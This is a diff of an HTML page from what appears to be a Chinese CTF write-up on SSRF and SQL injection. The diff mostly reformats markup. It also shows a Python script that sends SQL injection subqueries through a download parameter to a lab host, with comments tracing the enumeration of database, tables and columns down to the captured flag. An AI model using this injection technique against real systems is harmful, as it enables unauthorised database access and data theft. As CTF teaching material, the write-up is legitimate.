@@ -749,22 +749,22 @@
 <p>还是有问题，<code>.pdf</code>加在最后一个参数后面会影响其值，所以在参数后面再加一个&amp;，相当于隔断了<code>pdf</code></p>
 <p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="https://img-blog.csdnimg.cn/img_convert/057f4dc3fc2700e2819ca4679365972b.png#pic_center" alt=""></p>
 <p>注册成功。。注册的参数可以进行<code>sql注入</code>，大神的脚本：</p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests
 <span class="token keyword">import</span> random
 <span class="token keyword">import</span> urllib
 
 url <span class="token operator">=</span> <span class="token string">' http://111.200.241.244:64242//download.php'</span>
 
-<span class="token comment"># subquery = "database()"</span>
-<span class="token comment"># ssrfw</span>
-<span class="token comment"># subquery = "select group_concat(table_name) from information_schema.tables where table_schema='ssrfw'"</span>
-<span class="token comment"># etcYssrf,users</span>
-<span class="token comment"># subquery = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'"</span>
-<span class="token comment"># secretName,value</span>
-<span class="token comment"># subquery = "select secretName from cetcYssrf LIMIT 1"</span>
-<span class="token comment"># secretname -&gt; flag</span>
+ <span class="token comment"># subquery = "database()"</span>
+ <span class="token comment"># ssrfw</span>
+ <span class="token comment"># subquery = "select group_concat(table_name) from information_schema.   tables where table_schema='ssrfw'"</span>
+ <span class="token comment"># etcYssrf,users</span>
+ <span class="token comment"># subquery = "select group_concat(column_name) from information_schema.columns where table_name='cetcYssrf'"</span>
+ <span class="token comment"># secretName,value</span>
+ <span class="token comment"># subquery = "select secretName from cetcYssrf LIMIT 1"</span>
+ <span class="token comment"># secretname -&gt; flag</span>
 subquery <span class="token operator">=</span> <span class="token string">"select value from cetcYssrf LIMIT 1"</span>
-<span class="token comment"># value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018}</span>
+ <span class="token comment"># value -&gt; flag{cpg9ssnu_OOOOe333eetc_2018}</span>
 
 <span class="token builtin">id</span> <span class="token operator">=</span> random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">10000000</span><span class="token punctuation">)</span>
 
@@ -781,7 +781,9 @@ dl <span class="token operator">=</span> <span class="token punctuation">(</span
             <span class="token punctuation">}</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"&amp;"</span><span class="token punctuation">)</span>
 
 r <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"dl"</span><span class="token punctuation">:</span> dl<span class="token punctuation">}</span><span class="token punctuation">)</span>
-<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></h2><blockquote>
+<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<hr>
+<blockquote>
 <p><strong>知识点：</strong></p>
 <p><strong>1.ssrf</strong></p>
 <p><strong>2.sql注入</strong></p>
